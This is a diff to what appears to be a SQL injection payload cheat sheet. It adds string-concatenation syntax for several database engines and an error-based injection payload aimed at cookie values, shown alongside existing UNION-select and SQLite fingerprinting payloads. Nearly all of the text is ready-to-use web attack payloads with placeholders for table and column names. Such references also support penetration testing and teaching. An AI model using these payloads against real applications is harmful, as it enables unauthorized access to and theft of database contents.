@@ -43,6 +43,15 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 ' union select null, sqlite_version()-- - >> SQLite
 
 
+#String concatenation
+
+Oracle 	'foo'||'bar'
+Microsoft 	'foo'+'bar'
+PostgreSQL 	'foo'||'bar'
+MySQL 	'foo' 'bar' [Note the space between the two strings]
+CONCAT('foo','bar')
+
+
 #SQLite Database info retrieving
 
 (SELECT group_concat(tbl_name) FROM sqlite_master)
@@ -74,6 +83,8 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 ' union select [column name here],null from [table name here]-- -
 
 ' union select 1, column1 || colum2 from [database name here]-- -
+
+'||(select column1 from [table name here] limit 1)-- - >> Visible error based sqli in cookie value.
 
 
 #Mysql Database info retrieving
